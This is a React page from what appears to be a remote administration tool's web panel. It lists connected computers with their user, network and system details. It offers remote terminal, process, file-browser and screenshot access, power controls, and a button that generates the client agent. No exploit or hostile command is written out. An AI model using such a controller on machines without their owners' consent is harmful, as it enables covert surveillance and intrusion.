import React, {useRef, useState} from 'react';
import ProTable, {TableDropdown} from '@ant-design/pro-table';
import {Button, Image, message, Modal} from 'antd';
import {formatSize, request, tsToTime, waitTime} from "../utils/utils";
import Terminal from "../components/terminal";
import Processes from "../components/processes";
import Generate from "../components/generate";
import Browser from "../components/browser";
import {QuestionCircleOutlined} from "@ant-design/icons";

function overview(props) {
    const [screenBlob, setScreenBlob] = useState('');
    const [terminal, setTerminal] = useState(false);
    const [procMgr, setProcMgr] = useState(false);
    const [browser, setBrowser] = useState(false);
    const [isWindows, setIsWindows] = useState(false);
    const columns = [
        {
            key: 'Hostname',
            title: 'Hostname',
            dataIndex: 'hostname',
            ellipsis: true,
            width: 100
        },
        {
            key: 'Username',
            title: 'Username',
            dataIndex: 'username',
            ellipsis: true,
            width: 100
        },
        {
            key: 'OS',
            title: 'OS',
            dataIndex: 'os',
            ellipsis: true,
            width: 80
        },
        {
            key: 'Arch',
            title: 'Arch',
            dataIndex: 'arch',
            ellipsis: true,
            width: 70
        },
        {
            key: 'Mac',
            title: 'Mac',
            dataIndex: 'mac',
            ellipsis: true,
            width: 100
        },
        {
            key: 'LAN',
            title: 'LAN',
            dataIndex: 'lan',
            ellipsis: true,
            width: 100
        },
        {
            key: 'WAN',
            title: 'WAN',
            dataIndex: 'wan',
            ellipsis: true,
            width: 100
        },
        {
            key: 'Mem',
            title: 'Mem',
            dataIndex: 'mem',
            ellipsis: true,
            renderText: formatSize,
            width: 70
        },
        {
            key: 'Uptime',
            title: 'Uptime',
            dataIndex: 'uptime',
            ellipsis: true,
            renderText: tsToTime,
            width: 100
        },
        {
            key: 'Option',
            width: 180,
            title: '操作',
            dataIndex: 'id',
            valueType: 'option',
            ellipsis: true,
            render: (_, device) => renderOperation(device)
        },
    ];
    const options = {
        show: true,
        density: true,
        setting: false,
    };
    const tableRef = useRef();

    function renderOperation(device) {
        return [
            <a key='terminal' onClick={setTerminal.bind(null, device.id)}>终端</a>,
            <a key='procmgr' onClick={setProcMgr.bind(null, device.id)}>进程</a>,
            <a key='browser' onClick={() => {
                setBrowser(device.id);
                setIsWindows(device.os === 'windows');
            }}>文件</a>,
            <TableDropdown
                key='more'
                onSelect={(key) => callDevice(key, device.id)}
                menus={[
                    {key: 'screenshot', name: '截屏'},
                    {key: 'lock', name: '锁屏'},
                    {key: 'logoff', name: '注销'},
                    {key: 'hibernate', name: '休眠'},
                    {key: 'suspend', name: '睡眠'},
                    {key: 'restart', name: '重启'},
                    {key: 'shutdown', name: '关机'},
                    {key: 'offline', name: '离线'},
                ]}
            />,
        ]
    }

    function callDevice(act, device) {
        if (act === 'screenshot') {
            request('/api/device/screenshot/get', {device: device}, {}, {
                responseType: 'blob'
            }).then((res) => {
                if ((res.data.type??'').substring(0, 16) === 'application/json') {
                    res.data.text().then((str) => {
                        let data = {};
                        try {
                            data = JSON.parse(str);
                        } catch (e) {}
                        message.warn(data.msg??'请求服务器失败')
                    });
                } else {
                    if (screenBlob.length > 0) {
                        URL.revokeObjectURL(screenBlob);
                    }
                    setScreenBlob(URL.createObjectURL(res.data));
                }
            });
            return;
        }
        let menus = {
            lock: '锁屏',
            logoff: '注销',
            hibernate: '休眠',
            suspend: '睡眠',
            restart: '重启',
            shutdown: '关机',
            offline: '离线',
        };
        if (!menus.hasOwnProperty(act)) {
            return;
        }
        Modal.confirm({
            title: `确定要${menus[act]}该设备吗？`,
            icon: <QuestionCircleOutlined/>,
            okText: '确定',
            cancelText: '取消',
            onOk() {
                request('/api/device/' + act, {device: device}).then(res => {
                    let data = res.data;
                    if (data.code === 0) {
                        message.success('操作已执行');
                        tableRef.current.reload();
                    }
                });
            }
        });
    }

    function toolBar() {
        return (
            <Generate
                title='生成客户端'
                trigger={<Button type='primary'>生成客户端</Button>}
            />
        )
    }

    async function getData(form) {
        await waitTime(300);
        let res = await request('/api/device/list');
        let data = res.data;
        if (data.code === 0) {
            let result = [];
            for (const uuid in data.data) {
                let temp = data.data[uuid];
                temp.conn = uuid;
                result.push(temp);
            }
            result = result.sort((first, second) => {
                let firstEl = first.hostname.toUpperCase();
                let secondEl = second.hostname.toUpperCase();
                if (firstEl < secondEl) return -1;
                if (firstEl > secondEl) return 1;
                return 0;
            });
            result = result.sort((first, second) => {
                let firstEl = first.os.toUpperCase();
                let secondEl = second.os.toUpperCase();
                if (firstEl < secondEl) return -1;
                if (firstEl > secondEl) return 1;
                return 0;
            });
            return ({
                data: result,
                success: true,
                total: result.length
            });
        }
        return ({data: [], success: false, total: 0});
    }

    return (
        <>
            <Image
                preview={{
                    visible: screenBlob,
                    src: screenBlob,
                    onVisibleChange: () => {
                        URL.revokeObjectURL(screenBlob);
                        setScreenBlob('');
                    }
                }}
            />
            <Browser
                isWindows={isWindows}
                visible={browser}
                device={browser}
                onCancel={setBrowser.bind(null, false)}
            />
            <Processes
                visible={procMgr}
                device={procMgr}
                onCancel={setProcMgr.bind(null, false)}
            />
            <Terminal
                visible={terminal}
                device={terminal}
                onCancel={setTerminal.bind(null, false)}
            />
            <ProTable
                rowKey='id'
                search={false}
                options={options}
                columns={columns}
                request={getData}
                pagination={false}
                actionRef={tableRef}
                toolBarRender={toolBar}
            />
        </>
    );
}

function wrapper(props) {
    let Component = overview;
    return (<Component {...props} key={Math.random()}/>)
}

export default wrapper;